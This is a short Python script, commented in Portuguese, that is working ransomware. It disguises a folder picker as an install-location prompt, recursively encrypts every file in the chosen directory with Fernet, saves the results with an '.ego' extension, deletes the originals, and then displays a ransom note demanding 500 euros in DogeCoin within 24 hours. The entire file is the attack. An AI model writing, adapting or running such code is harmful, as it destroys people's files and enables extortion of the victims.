import os
import glob
import tkinter as tk
from tkinter import filedialog, messagebox
from cryptography.fernet import Fernet

# Pergunta à vitima qual é a diretoria para encriptar
root = tk.Tk()
root.withdraw()
pasta = filedialog.askdirectory(title="Selecione a directoria onde quer instalar o programa")

# Listar todos os ficheiros dentro da diretoria
print(os.listdir(pasta))

# Gerar uma chave do Fernet e guardar para um ficheiro à parte
chave = Fernet.generate_key()
with open("chave.key", "wb") as key_file:
    key_file.write(chave)

# Loop para procurar todos os ficheiros na diretoria
for ficheiro in glob.iglob(pasta + "/**/*.*", recursive=True):

        # Ler o conteúdo do ficheiro
        with open(ficheiro, "rb") as f:
            conteudo = f.read()

        # Usar a chave do Fernet para encriptar o ficheiro
        fernet = Fernet(chave)
        encriptado = fernet.encrypt(conteudo)

        # Renomear o ficheiro para ter a extensão .ego
        ego_ficheiro = ficheiro + ".ego"
        with open(ego_ficheiro, "wb") as f:
            f.write(encriptado)

        # Apagar o ficheiro original
        os.remove(ficheiro)

# Mostrar a caixa de texto com a nota de resgate
messagebox.showinfo("FOSTE ATACADO PELO EGO HAHA XD", "Todos os teus ficheiros foram encriptados. Se quiseres voltar a ter os teus ficheiros, manda 500€ em DogeCoin (DOGE) para esta carteira nas próximas 24 horas.")
messagebox.showinfo("FOSTE ATACADO PELO EGO HAHA XD", chave)